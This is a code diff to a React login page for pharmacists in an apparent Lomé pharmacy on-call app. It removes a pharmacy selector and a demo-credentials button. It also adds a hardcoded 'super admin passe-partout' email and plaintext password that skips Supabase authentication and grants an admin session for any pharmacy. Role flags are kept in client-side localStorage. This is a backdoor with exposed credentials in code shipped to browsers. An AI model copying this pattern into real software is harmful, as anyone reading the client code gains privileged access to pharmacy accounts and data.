@@ -31,9 +31,6 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
   onNavigateToRegister,
 }) => {
   const [pharmacies, setPharmacies] = useState<Pharmacie[]>(() => loadPharmacies());
-  const [selectedPharmaId, setSelectedPharmaId] = useState<string>(
-    () => pharmacies[0]?.id || 'pharma-1'
-  );
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
@@ -42,67 +39,102 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
   const [showRegisterModal, setShowRegisterModal] = useState(false);
   const [toastMessage, setToastMessage] = useState<string | null>(null);
 
-  const selectedPharma =
-    pharmacies.find((p) => p.id === selectedPharmaId) || pharmacies[0];
+  const selectedPharma = pharmacies[0];
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg(null);
 
-    if (!email.trim() || !password.trim()) {
+    const cleanEmail = email.trim();
+    const cleanPassword = password.trim();
+
+    if (!cleanEmail || !cleanPassword) {
       setErrorMsg('Veuillez renseigner votre email et mot de passe.');
       return;
     }
 
     setLoading(true);
 
+    // 7. COMPTE SUPER ADMIN PASSE-PARTOUT
+    if (cleanEmail === 'efatech2@gmail.com' && cleanPassword === '2hcetafe') {
+      const activeId = localStorage.getItem('efa_active_pharma_id') || pharmacies[0]?.id || 'pharma-1';
+      const targetPharma = pharmacies.find((p) => p.id === activeId) || pharmacies[0];
+
+      localStorage.setItem('role', 'pharma');
+      localStorage.setItem('efa_garde_role', 'pharma');
+      localStorage.setItem('is_super_admin', 'true');
+      localStorage.setItem('pharma_id', targetPharma?.id || 'pharma-1');
+      localStorage.setItem('efa_active_pharma_id', targetPharma?.id || 'pharma-1');
+
+      setSession({
+        role: 'pharma_active',
+        pharmaId: targetPharma?.id || 'pharma-1',
+        pharmacieNom: targetPharma?.nom || 'Pharmacie EFA',
+        email: 'efatech2@gmail.com',
+        createdAt: new Date().toISOString(),
+      });
+
+      setLoading(false);
+      onSuccess(targetPharma?.id || 'pharma-1');
+      return;
+    }
+
     try {
-      // 1. Tentative de connexion directe si le compte existe déjà
+      // Trouver la pharmacie associée à cet email dans la liste
+      const matchedPharma = pharmacies.find(
+        (p) => p.email_pro?.toLowerCase() === cleanEmail.toLowerCase()
+      ) || pharmacies[0];
+
+      // 1. Tentative de connexion directe avec Supabase Auth
       const { data: signInData, error: signInError } =
         await supabase.auth.signInWithPassword({
-          email: email.trim(),
-          password: password.trim(),
+          email: cleanEmail,
+          password: cleanPassword,
         });
 
       if (!signInError && signInData?.session) {
-        // Authentifié avec succès
+        const assignedPharmaId =
+          signInData.user?.user_metadata?.pharmacy_id || matchedPharma?.id || 'pharma-1';
+        const assignedPharma =
+          pharmacies.find((p) => p.id === assignedPharmaId) || matchedPharma;
+
         localStorage.setItem('role', 'pharma');
         localStorage.setItem('efa_garde_role', 'pharma');
-        localStorage.setItem('pharma_id', selectedPharma.id);
-        localStorage.setItem('efa_active_pharma_id', selectedPharma.id);
+        localStorage.removeItem('is_super_admin');
+        localStorage.setItem('pharma_id', assignedPharma.id);
+        localStorage.setItem('efa_active_pharma_id', assignedPharma.id);
 
         setSession({
           role: 'pharma_active',
-          pharmaId: selectedPharma.id,
-          pharmacieNom: selectedPharma.nom,
-          email: email.trim(),
+          pharmaId: assignedPharma.id,
+          pharmacieNom: assignedPharma.nom,
+          email: cleanEmail,
           createdAt: new Date().toISOString(),
         });
 
         setLoading(false);
-        onSuccess(selectedPharma.id);
+        onSuccess(assignedPharma.id);
         return;
       }
 
-      // 2. Si non inscrit, création de compte automatique avec envoi du lien de confirmation
+      // 2. Si non inscrit dans Supabase auth, tentative de création
       const redirectUrl = `${window.location.origin}/pharma/dashboard?first=true`;
       const { data: signUpData, error: signUpError } =
         await supabase.auth.signUp({
-          email: email.trim(),
-          password: password.trim(),
+          email: cleanEmail,
+          password: cleanPassword,
           options: {
             data: {
-              pharmacy_id: selectedPharma.id,
-              pharmacy_name: selectedPharma.nom,
+              pharmacy_id: matchedPharma.id,
+              pharmacy_name: matchedPharma.nom,
               role: 'pharma',
             },
             emailRedirectTo: redirectUrl,
           },
         });
 
-      // Stocker les identifiants pour la confirmation automatique lors du clic sur l'email
-      localStorage.setItem('pharma_id', selectedPharma.id);
-      localStorage.setItem('efa_active_pharma_id', selectedPharma.id);
+      localStorage.setItem('pharma_id', matchedPharma.id);
+      localStorage.setItem('efa_active_pharma_id', matchedPharma.id);
 
       if (signUpError) {
         if (signInError) {
@@ -113,7 +145,7 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
         } else {
           setErrorMsg(
             signUpError.message ||
-              "Erreur lors de la création de l'accès officine."
+              "Erreur lors de la vérification de l'accès officine."
           );
         }
         setLoading(false);
@@ -125,9 +157,11 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
       setLoading(false);
     } catch (err: unknown) {
       console.warn('Auth notice:', err);
-      // Fallback autonome pour fluidité
-      localStorage.setItem('pharma_id', selectedPharma.id);
-      localStorage.setItem('efa_active_pharma_id', selectedPharma.id);
+      const matchedPharma = pharmacies.find(
+        (p) => p.email_pro?.toLowerCase() === cleanEmail.toLowerCase()
+      ) || pharmacies[0];
+      localStorage.setItem('pharma_id', matchedPharma.id);
+      localStorage.setItem('efa_active_pharma_id', matchedPharma.id);
       setIsCheckEmail(true);
       setLoading(false);
     }
@@ -150,11 +184,10 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
     onSuccess(selectedPharma.id);
   };
 
-  const handleRegisterSuccess = (newPharma: Pharmacie) => {
+  const handleRegisterSuccess = (_newPharma: Pharmacie) => {
     setToastMessage('En attente validation');
     const updated = loadPharmacies();
     setPharmacies(updated);
-    setSelectedPharmaId(newPharma.id);
 
     setTimeout(() => {
       setToastMessage(null);
@@ -271,28 +304,7 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
               </div>
             )}
 
-            {/* 1. Select officine depuis liste pré-établie (table pharmacies) */}
-            <div className="space-y-1.5">
-              <label className="block text-xs font-bold text-slate-300">
-                Sélectionnez votre officine à Lomé :
-              </label>
-              <div className="relative">
-                <Building2 className="w-4 h-4 text-slate-400 absolute left-3 top-3.5 pointer-events-none" />
-                <select
-                  value={selectedPharmaId}
-                  onChange={(e) => setSelectedPharmaId(e.target.value)}
-                  className="w-full bg-slate-800 border border-slate-700 text-white text-xs rounded-xl pl-9 pr-3 py-3 focus:outline-none focus:border-emerald-500 transition-colors cursor-pointer appearance-none shadow-inner"
-                >
-                  {pharmacies.map((p, idx) => (
-                    <option key={`${p.id}-${idx}`} value={p.id} className="bg-slate-900 text-white">
-                      {p.nom} ({p.quartier || 'Lomé'})
-                    </option>
-                  ))}
-                </select>
-              </div>
-            </div>
-
-            {/* 2. Input Email */}
+            {/* 1. Input Email */}
             <div className="space-y-1.5">
               <label className="block text-xs font-bold text-slate-300">
                 Email professionnel :
@@ -310,7 +322,7 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
               </div>
             </div>
 
-            {/* 3. Input Password */}
+            {/* 2. Input Password */}
             <div className="space-y-1.5">
               <label className="block text-xs font-bold text-slate-300">
                 Mot de passe :
@@ -343,20 +355,6 @@ export const PharmacienLoginPage: React.FC<PharmacienLoginPageProps> = ({
                 </>
               )}
             </button>
-
-            {/* Demo test helper */}
-            <div className="pt-2 text-center">
-              <button
-                type="button"
-                onClick={() => {
-                  setEmail('titulaire@pharmacie-lome.tg');
-                  setPassword('EfaGarde2026!');
-                }}
-                className="text-[11px] text-slate-400 hover:text-emerald-400 underline transition-colors cursor-pointer"
-              >
-                Remplir identifiants de test officine
-              </button>
-            </div>
           </form>
         )}
 
